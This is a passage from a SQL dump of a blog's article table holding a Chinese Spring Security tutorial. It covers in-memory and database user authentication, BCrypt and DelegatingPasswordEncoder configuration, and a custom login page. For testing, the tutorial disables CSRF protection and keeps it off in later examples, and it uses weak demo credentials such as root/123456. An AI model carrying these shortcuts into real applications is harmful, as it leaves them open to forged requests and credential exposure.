<li>DefaultLogoutPageGeneratingFilter - 默认登出页生成</li>\n  <li>RequestCacheAwareFilter - 请求缓存处理</li>\n  <li>SecurityContextHolderAwareRequestFilter - 安全感知请求包装</li>\n  <li>AnonymousAuthenticationFilter - 匿名认证</li>\n  <li>SessionManagementFilter - 会话管理</li>\n  <li>ExceptionTranslationFilter - 异常转换</li>\n  <li>AuthorizationFilter - 授权检查</li>\n  <li>FilterSecurityInterceptor - 安全拦截器</li>\n</ol>\n<hr />\n<h2 id=\"四-securityproperties\">四. SecurityProperties</h2>\n<p>查看源代码（去除注释，getter,setter和一些包引用版）：</p>\n<pre><code class=\"language-java\">\npackage org.springframework.boot.security.autoconfigure;\n\nimport java.util.UUID;\n\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.util.StringUtils;\n\n@ConfigurationProperties(&quot;spring.security&quot;)\npublic class SecurityProperties {\n\n    public final User user = new User();\n\n    public static class User {\n        public String name = &quot;user&quot;;\n        public String password = UUID.randomUUID().toString();\n        public List&lt;String&gt; roles = new ArrayList&lt;&gt;();\n        public boolean passwordGenerated = true;\n\n        public void setPassword(String password) {\n            if (StringUtils.hasLength(password)) {\n                this.passwordGenerated = false;\n                this.password = password;\n            }\n        }\n    }\n}\n\n</code></pre>\n<p>可以看到这就是一个很寻常的 <code>Properties类</code>，发现使用了 <code>@ConfigurationProperties(&quot;spring.security&quot;)</code>，于是我们只需要在配置文件中配置spring.security.xxx就可以自定义属性。可以看到默认的 <code>name</code>是 <code>user</code>，密码是通过UUID自动生成的，这就是我们刚刚登录时候的账号和密码。</p>\n<blockquote>\n  <p><code>passwordGenerated</code>用于判断是否需要在控制台打印密码，当配置了密码是置为false。</p>\n</blockquote>\n<p>我们只需要在配置类中配置以下内容，就可以实现自定义账号密码了。</p>\n<pre><code class=\"language-yaml\">spring:\n  security:\n    user:\n      name: yourname\n      password: yourpassword\n</code></pre>\n<p>当然实际上肯定会使用更多的自定义配置，例如自定义的登录实现，这些内容在后续部分。</p>\n<p><strong>下一章</strong>：<a href=\"https://lilicould.cn/article/69\">系统学习Spring Security(二)</a></p>\n', 'https://oss.lilicould.cn/cover/a039305b-8235-4666-8937-26c27ed3b6de_spring-security.png', 1, 70, 2, '2026-04-11 14:56:24', '2026-05-19 10:09:53', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (69, '系统学习Spring Security(二)', 'spring-security-study-2', 'SpringSecurity自定义配置篇', '# 系统学习Spring Security(二)\n\n> 本文是学习Spring Security的第二篇笔记。先从基于内存的用户认证入门，了解 InMemoryUserDetailsManager 的使用；再实现基于数据库的认证，通过自定义 DBUserDetailsManager 实现 UserDetailsManager 接口，完成从 MySQL 加载用户信息；接着是 Spring Security 默认过滤器链配置，实现新增用户功能；然后介绍 BCrypt 等主流密码加密算法，配置 DelegatingPasswordEncoder 兼容多种加密方式；最后完成自定义登录页面，解决重定向循环问题，支持自定义表单参数与登录失败地址，为后续前后端分离架构打下基础。\n\n---\n\n## 一. 基于内存的数据源配置\n\n### 1. 基于内存的用户认证配置\n\n```java\n@EnableWebSecurity\n@Configuration\npublic class SecurityConfig {\n  @Bean\n  // 需要被配置的类，例如\n  public UserDetailsService userDetailsService() {\n    // 创建基于内存的用户档案管理器\n    InMemoryUserDetailsManager manager = new InMemoryUserDetailsManager();\n\n    // 创建用户档案\n    manager.createUser(User.withDefaultPasswordEncoder()\n            .username(\"user\")\n            .password(\"password\")\n            .roles(\"USER\")\n            .build());\n    return manager;\n  }\n}\n\n```\n\n> 对于非SpringBoot项目，需要加上 `@EnableWebSecurity`，但是对于SpringBoot项目，已经自动配置了 `@EnableWebSecurity`，所以完全可以去掉这个注解\n\n对于withDefaultPasswordEncoder()方法，这个方法用于生成一个自动对密码加密的 `UserBuilder`实例,用于创建User对象，但是这个方法由于不安全所以被官方弃用了。以下是官方的解释。\n\n> 这对生产环境不安全（主要是用于入门体验），因为密码“password”会被编译进源代码，然后在创建时被包含在内存中。这意味着仍有方法可以恢复明文密码，使其变得不安全。它确实比使用纯文本密码略有改进，因为 UserDetails 密码是安全的哈希处理的。这意味着如果用户详情密码意外泄露，密码会被安全保存。在生产环境中，建议提前对密码进行哈希.\n\n### 2. 测试\n\n重新运行项目，登录输入新配置的账号密码，发现正常登录，配置文件中的账号密码失效。说明自定义配置成功。\n**此时我们的数据源依旧是基于内存的，后面会学习基于数据库的数据源配置**\n\n### 3. 基于内存的用户认证流程\n\n- 程序启动时：\n  - 创建InMemoryUserDetailsManager对象\n  - 创建User对象，封装用户名密码\n  - 使用InMemoryUserDetailsManager将User存入内存\n- 校验用户时：\n  - SpringSecurity自动使用InMemoryUserDetailsManager的loadUserByUsername方法从内存中获取User对象\n  - 在UsernamePasswordAuthenticationFilter过滤器中的attemptAuthentication方法中将用户输入的用户名密码和从内存中获取到的用户信息进行比较，进行用户认证\n\n---\n\n## 二. 基于数据库的数据源配置\n\n### 1. 创建数据库和最基础的用户表\n\n```sql\n-- 创建数据库\nCREATE DATABASE `security_demo`;\nUSE `security_demo`;\n\n-- 创建用户表\nCREATE TABLE `user` (\n    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,\n    `username` VARCHAR(50) DEFAULT NULL,\n    `password` VARCHAR(500) DEFAULT NULL,\n    `enabled` BOOLEAN NOT NULL\n);\n-- 唯一索引\nCREATE UNIQUE INDEX `user_username_uindex` ON `user`(`username`);\n\n-- 插入用户数据(密码是 \"abc\" )\nINSERT INTO `user` (`username`, `password`, `enabled`) VALUES\n(\'admin\', \'{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW\', TRUE),\n(\'Helen\', \'{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW\', TRUE),\n(\'Tom\', \'{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW\', TRUE);\n```\n\n### 2. Java配置\n\n#### (1) 导入MySQL驱动和mybatis-plus依赖\n\n```xml\n<dependency>\n    <groupId>com.mysql</groupId>\n    <artifactId>mysql-connector-j</artifactId>\n</dependency>\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-spring-boot4-starter</artifactId>\n    <version>3.5.15</version>\n</dependency>\n```\n\n注意这里由于使用的是springboot4,所以mybatis-plus是要导入 `mybatis-plus-spring-boot4-starter`,具体需要导哪个版本建议去[官网](https://baomidou.com/getting-started/install/)查看\n\n#### (2) 配置数据源\n\n```yaml\nspring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/security_demo?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=Asia/Shanghai\n    username: root\n    password: 123456\n    driver-class-name: com.mysql.cj.jdbc.Driver\nmybatis-plus:\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl # 启用mybatis日志\n```\n\n#### (3) 根据用户表生成实体类User\n\n```java\npackage cn.lilicould.securitydemo.entity;\n\n...\n\n@Data\npublic class User implements Serializable {\n\n    @Serial\n    private static final long serialVersionUID = 1L;\n\n    @TableId(value = \"id\", type = IdType.AUTO) // 设置主键自增\n    private Integer id;\n\n    private String username;\n    private String password;\n    private Boolean enabled;\n}\n\n```\n\n#### (4) 创建持久层和业务层以及Controller\n\n正常SpringBoot项目结构配置就好了，此处省略。\n\n### 3. 基于数据库的用户认证配置\n\n#### (1) 流程分析\n\n点进之前使用的 `InMemoryUserDetailsManager`的源码，发现它实现了 `UserDetailsManager`, `UserDetailsPasswordService`两个接口。分析 `UserDetailsManager`，发现定义了以下五个方法：\n\n```java\nvoid createUser(UserDetails user);\nvoid updateUser(UserDetails user);\nvoid deleteUser(String username);\nvoid changePassword(String oldPassword, String newPassword);\nboolean userExists(String username);\n```\n\n并且 `UserDetailsManager`继承了 `UserDetailsService`接口，又定义了一个 `loadUserByUsername`方法：\n\n```java\nUserDetails loadUserByUsername(String username) throws UsernameNotFoundException;\n```\n\n再分析 `UserDetailsPasswordService`，发现定义了一个更新密码的方法：\n**Tip:**明明 `UserDetailsService`定义了changePassword，为什么这里还要定义一个 `updatePassword`呢？\n这是因为 `updatePassword`是给 Spring Security 内部自动调用的，用于登录时自动升级密码加密，自己代码里永远不会主动调用。比如用户登录成功后，如果框架发现数据库里的密码加密方式太旧（比如 MD5），会自动用新算法（BCrypt）重新加密一遍，并通过 updatePassword 存回数据库，全程自己不用写任何代码。\n\n```java\nUserDetails updatePassword(UserDetails user, @Nullable String newPassword);\n```\n\n所以我们需要自己定义一个基于数据库的 `UserDetailsManager`类并实现 `UserDetailsManager`, `UserDetailsPasswordService`这两个接口。为此我们需要实现七个方法。\n\n#### (2) 完整流程\n\n- 程序启动时：\n  - 创建DBUserDetailsManager类，实现接口 UserDetailsManager, UserDetailsPasswordService\n  - 在应用程序中初始化这个类的对象\n- 校验用户时：\n  - SpringSecurity自动使用DBUserDetailsManager的loadUserByUsername方法从数据库中获取User对象\n  - 在UsernamePasswordAuthenticationFilter过滤器中的attemptAuthentication方法中将用户输入的用户名密码和从数据库中获取到的用户信息进行比较，进行用户认证\n\n#### (3) 具体实现\n\n首先实现 `loadUserByUsername`实现从数据库中加载user对象\n\n```java\npackage cn.lilicould.securitydemo.config;\n\nimport cn.lilicould.securitydemo.entity.User;\n\npublic class DBUserDetailsManager implements UserDetailsManager, UserDetailsPasswordService {\n\n    @Resource\n    pricate UserMapper userMapper;\n\n    ...其他实现省略\n\n    @Override\n    @NullUnmarked\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n        queryWrapper.eq(\"username\", username);\n\n        // 由于username是唯一的，所以这里查询到的最多只有一条数据\n        User user = userMapper.selectOne(queryWrapper);\n\n        Collection<GrantedAuthority> authorities = new ArrayList<>();\n\n        if (user ==  null) {\n            throw new UsernameNotFoundException(\"用户不存在\");\n        } else {\n            return new org.springframework.security.core.userdetails.User(\n                    user.getUsername(),\n                    user.getPassword(),\n                    user.getEnabled(),\n                    true, // 账号是否未过期\n                    true, // 用户凭证是否未过期\n                    true, // 账号是否未锁定\n                    authorities // 权限列表\n            );\n        }\n    }\n}\n\n```\n\n注意这里的返回时候使用security提供的 `org.springframework.security.core.userdetails.User`对我们获取到的User做了封装，实际使用也可以让我们自己的User实现UserDetails接口。\n\n然后在 `SecurityConfig`中配置 `userDetailsService`为 `DBUserDetailsManager`即可\n\n```java\n@EnableWebSecurity\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public DBUserDetailsManager userDetailsService() {\n        // 创建基于数据库的用户档案管理器\n        return new DBUserDetailsManager();\n    }\n}\n```\n\n并且因为我们的 `DBUserDetailsManager`实现了 `UserDetailsManager`，而它本身又继承自 `UserDetailsService`，所以只要给 `DBUserDetailsManager`加上 `@Component`交给 Spring 管理，就不用再单独去注册一个 `UserDetailsService`了。\n这样我们就完成了基于数据库的用户认证的基本配置。\n\n## 三. SpingSecurity的默认配置\n\n### (1) 默认配置\n\n```java\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -> authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(Customizer.withDefaults())\n        // 3. 开启 Basic Auth 认证（通常用于接口测试，很少使用甚至可以直接删除）\n        .httpBasic(Customizer.withDefaults());\n    // 4. 构建过滤器链\n    return http.build();\n}\n```\n\n## 四. 创建用户功能的实现\n\n### 1. 实现方式\n\n前面我们的 `DBUserDetailsManager`中需要对createUser等方法进行实现，我们在其中编写如以下配置的实现：\n\n```java\n@Override\npublic void createUser(UserDetails userDetails) {\n    User user = new User();\n    user.setUsername(userDetails.getUsername());\n    user.setPassword(userDetails.getPassword());\n    user.setEnabled(true);\n    userMapper.insert(user);\n}\n\n```\n\n其实就是将User插入到数据库中，然后在业务层中调用这个方法。但其实也可以直接在业务层把User中插入到数据库中就好了，毕竟只要数据库中有数据，我们通过 `loadUserByUsername()`能够拿到数据就可以了。包括其他的几个方法也都不是很有必要去实现。具体根据自己的习惯决定使用方法。\n\n### 2. 测试\n\n通过swagger进行测试\n导入依赖\n\n```xml\n<dependency>\n    <groupId>org.springdoc</groupId>\n    <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>\n    <version>3.0.2</version>\n</dependency>\n```\n\n然后可以通过 `/swagger-ui/index.html`访问到接口文档并很方便地进行测试。\n测试结果：\n![](https://oss.lilicould.cn/file/8c70beae-02f6-4f66-9fc4-f079163a77ab_image.png)\n发现出现了403错误。这是因为Spring Security默认开启了csrf(跨站请求伪造)防护，通过以下配置临时关闭csrf防御重新测试即可。\n\n```java\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -> authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(Customizer.withDefaults())\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n}\n```\n\n重新测试结果：\n![](https://oss.lilicould.cn/file/07a91bc0-bf73-4f48-9f99-633cad4d42f1_image.png)\n可以发现成功插入用户到数据库表中，但是此时密码并没有进行加密。\n\n## 五. 密码加密配置\n\n### 1. 密码加密算法\n\n见[密码加密算法](https://lilicould.cn/article/s/password-encryption-algorithm)\n\n### 2. PasswordEncoder\n\n**BCryptPasswordEncoder**\n\n使用广泛支持的bcrypt算法来对密码进行哈希。为了增加对密码破解的抵抗力，bcrypt故意设计得较慢。和其他自适应单向函数一样，应该调整其参数，使其在您的系统上验证一个密码大约需要1秒的时间。BCryptPasswordEncoder的默认实现使用强度10。建议您在自己的系统上调整和测试强度参数，以便验证密码时大约需要1秒的时间。\n\n**Argon2PasswordEncoder**\n\n使用Argon2算法对密码进行哈希处理。Argon2是密码哈希比赛的获胜者。为了防止在自定义硬件上进行密码破解，Argon2是一种故意缓慢的算法，需要大量内存。与其他自适应单向函数一样，它应该在您的系统上调整为大约1秒来验证一个密码。当前的Argon2PasswordEncoder实现需要使用BouncyCastle库。\n\n**Pbkdf2PasswordEncoder**\n\n使用PBKDF2算法对密码进行哈希处理。为了防止密码破解，PBKDF2是一种故意缓慢的算法。与其他自适应单向函数一样，它应该在您的系统上调整为大约1秒来验证一个密码。当需要FIPS认证时，这种算法是一个很好的选择。\n\n![](https://oss.lilicould.cn/file/704b2956-8848-4a38-9891-9721d6b3967a_image.png)\n**SCryptPasswordEncoder**\n\n使用scrypt算法对密码进行哈希处理。为了防止在自定义硬件上进行密码破解，scrypt是一种故意缓慢的算法，需要大量内存。与其他自适应单向函数一样，它应该在您的系统上调整为大约1秒来验证一个密码。\n\n### 3. 密码加密测试\n\n```java\n@Test\nvoid testPassword() {\n\n    // 工作因子，默认值是10，最小值是4，最大值是31，值越大运算速度越慢\n    PasswordEncoder encoder = new BCryptPasswordEncoder(4);\n    //明文：\"123456\"\n    //密文：result，即使明文密码相同，每次生成的密文也不一致\n    String result = encoder.encode(\"123456\");\n    System.out.println(result);\n\n    //密码校验\n    Assert.isTrue(encoder.matches(\"123456\", result), \"密码不一致\");\n}\n```\n\n测试结果：\n![](https://oss.lilicould.cn/file/868aba1f-3a19-4f71-b720-d25e832fad91_image.png)\n多次重复测试还可以发现即使明文相同，每次生成的密文也是不同的。\n\n### 4. DelegatingPasswordEncoder\n\n- 表中存储的密码形式：{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW\n- SpringSecurity验证密码时会根据密码前缀判断以何种方式校验\n- 目的：方便随时做密码策略的升级，兼容数据库中的老版本密码策略生成的密码\n\n### 5. 配置DelegatingPasswordEncoder\n\n```java\n@Bean\npublic PasswordEncoder passwordEncoder() {\n    // 创建密码编码器\n    Map<String, PasswordEncoder> encoders = new HashMap<>();\n    // 创建 BCryptPasswordEncoder\n    encoders.put(\"bcrypt\", new BCryptPasswordEncoder());\n\n    // 创建 DelegatingPasswordEncoder，设置默认加密方式为bcrypt\n    DelegatingPasswordEncoder delegate = new DelegatingPasswordEncoder(\"bcrypt\", encoders);\n    // 设置默认的密码编码器，当密码无{xxx}表示前缀时，使用这个编码器验证密码\n    delegate.setDefaultPasswordEncoderForMatches(new BCryptPasswordEncoder());\n    return delegate;\n}\n```\n\n## 六. 自定义登录页配置\n\n### 1. 结构搭建\n\n首先搭建好自定义登录页的结构\n\n#### (1) LoginController\n\n```java\npackage cn.lilicould.securitydemo.controller;\n\n@Controller\npublic class LoginController {\n\n    @GetMapping(\"/login\")\n    public String login() {\n        return \"login\";\n    }\n}\n\n```\n\n#### (2) 视图页面\n\n```html\n<!DOCTYPE html>\n<html xmlns:th=\"https://www.thymeleaf.org\">\n<head>\n    <title>登录</title>\n</head>\n<body>\n<h1>登录</h1>\n<div th:if=\"${param.error}\">\n    错误的用户名和密码.</div>\n\n<!--method必须为\"post\"-->\n<!--th:action=\"@{/login}\" ，\n使用动态参数，表单中会自动生成_csrf隐藏字段，用于防止csrf攻击\nlogin: 和登录页面保持一致即可，SpringSecurity自动进行登录认证-->\n<form th:action=\"@{/login}\" method=\"post\">\n    <div>\n        <!--name必须为\"username\"-->\n        <label>\n            <input type=\"text\" name=\"username\" placeholder=\"用户名\"/>\n        </label>\n    </div>\n    <div>\n        <!--name必须为\"password\"-->\n        <label>\n            <input type=\"password\" name=\"password\" placeholder=\"密码\"/>\n        </label>\n    </div>\n    <input type=\"submit\" value=\"登录\" />\n</form>\n</body>\n</html>\n```\n\n### 2. Security配置\n\n此时启动项目，发现登录页面依旧是Security默认提供的，这是因为还需要对Security进行配置。\n\n```java\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -> authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(Customizer.withDefaults())\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n}\n```\n\n默认的配置中formLogin的配置是 `Customizer.withDefaults()`，我们需要把它改成我们mvc控制器的 `/login`。\n\n```java\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -> authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 使用自定义的登录界面\n        .formLogin(form ->\n                form.loginPage(\"/login\")\n        )\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n}\n```\n\n此时重新启动项目，会发现提示我们重定向过多次。\n\n![重定向过多](https://lilicould.cn:8888/uploads/774e1e37-fdc8-4aa7-90be-5a8dd1e87d5c.png)\n这是因为在授权规则中，所有的请求都需要认证，这也包括了 `/login`,于是这个请求会被重定向到它自己，然后继续被过滤器处理继续重定向...所以我们还需要修改授权规则，放行 `/login`请求。\n\n```java\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // 1. 授权规则：所有请求都必须认证\n            .authorizeHttpRequests(authorize -> authorize\n                    .anyRequest().authenticated()\n            )\n            // 2. 使用自定义的登录界面\n            .formLogin(form ->\n                    form.loginPage(\"/login\").permitAll() // 加上permitAll实现无需授权即可访问\n            )\n            // 3. 开启 Basic Auth 认证（通常用于接口测试）\n            .httpBasic(Customizer.withDefaults());\n        http.csrf(AbstractHttpConfigurer::disable);\n        // 4. 构建过滤器链\n        return http.build();\n    }\n```\n\n这样我们就实现了自定义登录界面\n\n![](https://oss.lilicould.cn/file/34de86d5-b92d-4511-9fa4-1c996f2a47cc_image.png)\n\n### 3. 细节补充\n\n前面定义前端页面时候要求表单用户名必须使用username，密码必须使用password，但是后端进行配置之后也可以使用自定义的表单名。通过配置 `usernameParameter`和 `passwordParameter`即可使用自定义的表单名。\n\n```java\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -> authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(form ->\n                form.loginPage(\"/login\")\n                        .permitAll()\n                        .usernameParameter(\"myUsername\")\n                        .passwordParameter(\"myPassword\")\n        )\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n  }\n)\n```\n\n另外校验失败的时候默认会跳转到 `/login?error`，这个默认地址也是可以修改的，和 `usernameParameter`、`passwordParameter`使用方法一样，使用 `failureForwardUrl`就可以了。\n\n### 4. 前后端说明\n\n不管怎么修改，只要保持前后端字段一致就可以了。当然现在这些配置并不是前后端分离的，后面的内容为前后端分离架构使用Security。\n\n**上一章：**[系统学习Spring Security(一)](https://lilicould.cn/article/68)\n\n**下一章：**[系统学习Spring Security(三)](https://lilicould.cn/article/72)\n', '<h1 id=\"系统学习spring-security二\">系统学习Spring Security(二)</h1>\n<blockquote>\n  <p>本文是学习Spring Security的第二篇笔记。先从基于内存的用户认证入门，了解 InMemoryUserDetailsManager 的使用；再实现基于数据库的认证，通过自定义 DBUserDetailsManager 实现 UserDetailsManager 接口，完成从 MySQL 加载用户信息；接着是 Spring Security 默认过滤器链配置，实现新增用户功能；然后介绍 BCrypt 等主流密码加密算法，配置 DelegatingPasswordEncoder 兼容多种加密方式；最后完成自定义登录页面，解决重定向循环问题，支持自定义表单参数与登录失败地址，为后续前后端分离架构打下基础。</p>\n</blockquote>\n<hr />\n<h2 id=\"一-基于内存的数据源配置\">一. 基于内存的数据源配置</h2>\n<h3 id=\"1-基于内存的用户认证配置\">1. 基于内存的用户认证配置</h3>\n<pre><code class=\"language-java\">@EnableWebSecurity\n@Configuration\npublic class SecurityConfig {\n  @Bean\n  // 需要被配置的类，例如\n  public UserDetailsService userDetailsService() {\n    // 创建基于内存的用户档案管理器\n    InMemoryUserDetailsManager manager = new InMemoryUserDetailsManager();\n\n    // 创建用户档案\n    manager.createUser(User.withDefaultPasswordEncoder()\n            .username(&quot;user&quot;)\n            .password(&quot;password&quot;)\n            .roles(&quot;USER&quot;)\n            .build());\n    return manager;\n  }\n}\n\n</code></pre>\n<blockquote>\n  <p>对于非SpringBoot项目，需要加上 <code>@EnableWebSecurity</code>，但是对于SpringBoot项目，已经自动配置了 <code>@EnableWebSecurity</code>，所以完全可以去掉这个注解</p>\n</blockquote>\n<p>对于withDefaultPasswordEncoder()方法，这个方法用于生成一个自动对密码加密的 <code>UserBuilder</code>实例,用于创建User对象，但是这个方法由于不安全所以被官方弃用了。以下是官方的解释。</p>\n<blockquote>\n  <p>这对生产环境不安全（主要是用于入门体验），因为密码“password”会被编译进源代码，然后在创建时被包含在内存中。这意味着仍有方法可以恢复明文密码，使其变得不安全。它确实比使用纯文本密码略有改进，因为 UserDetails 密码是安全的哈希处理的。这意味着如果用户详情密码意外泄露，密码会被安全保存。在生产环境中，建议提前对密码进行哈希.</p>\n</blockquote>\n<h3 id=\"2-测试\">2. 测试</h3>\n<p>重新运行项目，登录输入新配置的账号密码，发现正常登录，配置文件中的账号密码失效。说明自定义配置成功。<br>\n<strong>此时我们的数据源依旧是基于内存的，后面会学习基于数据库的数据源配置</strong></p>\n<h3 id=\"3-基于内存的用户认证流程\">3. 基于内存的用户认证流程</h3>\n<ul>\n  <li>程序启动时：\n    <ul>\n      <li>创建InMemoryUserDetailsManager对象</li>\n      <li>创建User对象，封装用户名密码</li>\n      <li>使用InMemoryUserDetailsManager将User存入内存</li>\n    </ul>\n  </li>\n  <li>校验用户时：\n    <ul>\n      <li>SpringSecurity自动使用InMemoryUserDetailsManager的loadUserByUsername方法从内存中获取User对象</li>\n      <li>在UsernamePasswordAuthenticationFilter过滤器中的attemptAuthentication方法中将用户输入的用户名密码和从内存中获取到的用户信息进行比较，进行用户认证</li>\n    </ul>\n  </li>\n</ul>\n<hr />\n<h2 id=\"二-基于数据库的数据源配置\">二. 基于数据库的数据源配置</h2>\n<h3 id=\"1-创建数据库和最基础的用户表\">1. 创建数据库和最基础的用户表</h3>\n<pre><code class=\"language-sql\">-- 创建数据库\nCREATE DATABASE `security_demo`;\nUSE `security_demo`;\n\n-- 创建用户表\nCREATE TABLE `user` (\n    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,\n    `username` VARCHAR(50) DEFAULT NULL,\n    `password` VARCHAR(500) DEFAULT NULL,\n    `enabled` BOOLEAN NOT NULL\n);\n-- 唯一索引\nCREATE UNIQUE INDEX `user_username_uindex` ON `user`(`username`);\n\n-- 插入用户数据(密码是 &quot;abc&quot; )\nINSERT INTO `user` (`username`, `password`, `enabled`) VALUES\n(\'admin\', \'{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW\', TRUE),\n(\'Helen\', \'{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW\', TRUE),\n(\'Tom\', \'{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW\', TRUE);\n</code></pre>\n<h3 id=\"2-java配置\">2. Java配置</h3>\n<h4 id=\"1-导入mysql驱动和mybatis-plus依赖\">(1) 导入MySQL驱动和mybatis-plus依赖</h4>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n    &lt;groupId&gt;com.mysql&lt;/groupId&gt;\n    &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;\n    &lt;artifactId&gt;mybatis-plus-spring-boot4-starter&lt;/artifactId&gt;\n    &lt;version&gt;3.5.15&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>注意这里由于使用的是springboot4,所以mybatis-plus是要导入 <code>mybatis-plus-spring-boot4-starter</code>,具体需要导哪个版本建议去<a href=\"https://baomidou.com/getting-started/install/\">官网</a>查看</p>\n<h4 id=\"2-配置数据源\">(2) 配置数据源</h4>\n<pre><code class=\"language-yaml\">spring:\n  datasource:\n    url: jdbc:mysql://localhost:3306/security_demo?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai\n    username: root\n    password: 123456\n    driver-class-name: com.mysql.cj.jdbc.Driver\nmybatis-plus:\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl # 启用mybatis日志\n</code></pre>\n<h4 id=\"3-根据用户表生成实体类user\">(3) 根据用户表生成实体类User</h4>\n<pre><code class=\"language-java\">package cn.lilicould.securitydemo.entity;\n\n...\n\n@Data\npublic class User implements Serializable {\n\n    @Serial\n    private static final long serialVersionUID = 1L;\n\n    @TableId(value = &quot;id&quot;, type = IdType.AUTO) // 设置主键自增\n    private Integer id;\n\n    private String username;\n    private String password;\n    private Boolean enabled;\n}\n\n</code></pre>\n<h4 id=\"4-创建持久层和业务层以及controller\">(4) 创建持久层和业务层以及Controller</h4>\n<p>正常SpringBoot项目结构配置就好了，此处省略。</p>\n<h3 id=\"3-基于数据库的用户认证配置\">3. 基于数据库的用户认证配置</h3>\n<h4 id=\"1-流程分析\">(1) 流程分析</h4>\n<p>点进之前使用的 <code>InMemoryUserDetailsManager</code>的源码，发现它实现了 <code>UserDetailsManager</code>, <code>UserDetailsPasswordService</code>两个接口。分析 <code>UserDetailsManager</code>，发现定义了以下五个方法：</p>\n<pre><code class=\"language-java\">void createUser(UserDetails user);\nvoid updateUser(UserDetails user);\nvoid deleteUser(String username);\nvoid changePassword(String oldPassword, String newPassword);\nboolean userExists(String username);\n</code></pre>\n<p>并且 <code>UserDetailsManager</code>继承了 <code>UserDetailsService</code>接口，又定义了一个 <code>loadUserByUsername</code>方法：</p>\n<pre><code class=\"language-java\">UserDetails loadUserByUsername(String username) throws UsernameNotFoundException;\n</code></pre>\n<p>再分析 <code>UserDetailsPasswordService</code>，发现定义了一个更新密码的方法：<br>\n**Tip:**明明 <code>UserDetailsService</code>定义了changePassword，为什么这里还要定义一个 <code>updatePassword</code>呢？<br>\n这是因为 <code>updatePassword</code>是给 Spring Security 内部自动调用的，用于登录时自动升级密码加密，自己代码里永远不会主动调用。比如用户登录成功后，如果框架发现数据库里的密码加密方式太旧（比如 MD5），会自动用新算法（BCrypt）重新加密一遍，并通过 updatePassword 存回数据库，全程自己不用写任何代码。</p>\n<pre><code class=\"language-java\">UserDetails updatePassword(UserDetails user, @Nullable String newPassword);\n</code></pre>\n<p>所以我们需要自己定义一个基于数据库的 <code>UserDetailsManager</code>类并实现 <code>UserDetailsManager</code>, <code>UserDetailsPasswordService</code>这两个接口。为此我们需要实现七个方法。</p>\n<h4 id=\"2-完整流程\">(2) 完整流程</h4>\n<ul>\n  <li>程序启动时：\n    <ul>\n      <li>创建DBUserDetailsManager类，实现接口 UserDetailsManager, 